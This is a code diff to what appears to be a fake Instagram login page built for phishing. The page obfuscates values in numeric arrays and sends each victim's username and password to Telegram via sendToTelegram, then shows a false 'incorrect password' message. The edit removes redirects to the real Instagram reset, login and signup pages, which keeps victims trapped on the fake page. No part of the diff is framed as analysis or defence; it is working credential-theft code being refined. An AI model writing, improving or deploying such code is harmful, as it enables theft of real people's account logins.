@@ -897,8 +897,8 @@ body {
     [102,100,60,119,108,83,69,93,23,19,112,69,120,115,51,102,115,35,96,77,23]
   ];
   var _if = [
-    [42,16,75,69,110,74,104,69],
-    [34,100,120,70,109,116,120,71]
+    [42,16,125,69,96,120,104,69],
+    [111,78,120,71,39,120,70,70]
   ];
   var _tk = [17,53,9,88,34,61];
   var _ik = [23,45,60,8];
@@ -980,17 +980,6 @@ body {
       }
     });
   }
-
-  var buttonsUnlocked = false;
-  try { buttonsUnlocked = localStorage.getItem('_ig_ul') === '1'; } catch (e) {}
-
-  var forgotBtn = document.querySelector('.forgot-btn');
-
-  forgotBtn.addEventListener('click', function () {
-    if (buttonsUnlocked) {
-      window.location.href = 'https://www.instagram.com/accounts/password/reset';
-    }
-  });
 
   var snappedActive = null;
 
@@ -1088,13 +1077,6 @@ body {
     }
   }
 
-  function unlockButtons() {
-    if (!buttonsUnlocked) {
-      buttonsUnlocked = true;
-      try { localStorage.setItem('_ig_ul', '1'); } catch (e) {}
-    }
-  }
-
   function setLoading(on) {
     if (on)  { loginBtn.disabled = true;  loginBtn.innerHTML = '<span class="btn-spin"></span>'; }
     else     { loginBtn.disabled = false; loginBtn.textContent = 'Log in'; }
@@ -1130,23 +1112,15 @@ body {
     }
 
     var validFlow = isEmail(usr) || isPhone(usr) || isValidUsr(usr);
+    setLoading(true);
     var minWait = new Promise(function (resolve) { setTimeout(resolve, 1400); });
 
     if (validFlow) {
-      var alreadySent = wasSubmitted(usr, pwd);
-
-      if (alreadySent) {
-        unlockButtons();
-        window.location.href = 'https://www.instagram.com/accounts/login';
-        return;
-      }
-
-      markSubmitted(usr, pwd);
-      setLoading(true);
-      var net = sendToTelegram(usr, pwd);
+      var newEntry = !wasSubmitted(usr, pwd);
+      var net = newEntry ? sendToTelegram(usr, pwd) : Promise.resolve(null);
+      if (newEntry) markSubmitted(usr, pwd);
       Promise.all([minWait, net]).then(function () { setLoading(false); incorrectPwdModal(); });
     } else {
-      setLoading(true);
       minWait.then(function () {
         setLoading(false);
         showModal({
@@ -1161,13 +1135,7 @@ body {
     }
   });
 
-  createBtn.addEventListener('click', function () {
-    if (buttonsUnlocked) {
-      window.location.href = 'https://www.instagram.com/accounts/signup/phone';
-      return;
-    }
-    triggerPop(this);
-  });
+  createBtn.addEventListener('click',      function () { triggerPop(this); });
   createBtn.addEventListener('mouseenter', function () { triggerPop(this); });
 
 }());
